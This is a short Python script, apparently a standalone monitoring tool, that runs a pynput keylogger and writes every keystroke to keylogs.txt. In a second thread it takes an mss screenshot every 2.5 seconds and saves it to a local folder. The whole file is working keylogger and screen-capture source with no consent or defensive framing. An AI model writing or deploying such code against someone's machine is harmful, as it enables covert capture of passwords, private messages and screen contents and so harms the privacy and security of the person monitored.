import time
from datetime import datetime
import os
from threading import Timer, Thread
from mss import mss
from pynput.keyboard import Listener
import logging


class IntervalTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)


class Monitor:

    try:
        logging.basicConfig(filename="keylogs.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
    except Exception as e:
        print(e)

    def _on_press(self, key):
        logging.info(key)

    def _keylogger(self):
        with Listener(on_press=self._on_press) as listener:
            listener.join()

    def _screenshot(self):
        sct = mss()
        c_time = datetime.now().strftime("%H:%M:%S").split(':')
        c_time2 = c_time[0]+"-"+c_time[1]+"-"+c_time[2]
        sct.shot(output="./screenshots/"+c_time2+".png")

    def run(self, interval=2.5):
        """
        Launch the keylogger and screenshot taker in two separate threads.
        Interval is the amount of time in seconds that occurs between screenshots.
        """
        Thread(target=self._keylogger).start()
        IntervalTimer(interval, self._screenshot).start()

if __name__ == '__main__':
    mon = Monitor()
    mon.run()
